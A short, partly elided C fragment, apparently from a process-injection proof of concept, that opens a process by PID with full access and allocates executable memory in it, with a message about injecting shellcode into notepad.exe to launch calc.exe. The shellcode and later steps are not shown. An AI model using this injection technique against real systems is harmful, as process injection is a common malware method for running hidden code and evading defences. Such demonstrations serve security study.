...
"\x00";
    ...
    printf("Injecting shellcode into notepad.exe and popping calc.exe!\n\n");
    printf("Injecting to PID: %i\n\n", atoi(argv[1]));

    pHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, atoi(argv[1]));
    rBuffer = VirtualAllocEx(pHandle, NULL, sizeof buf, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
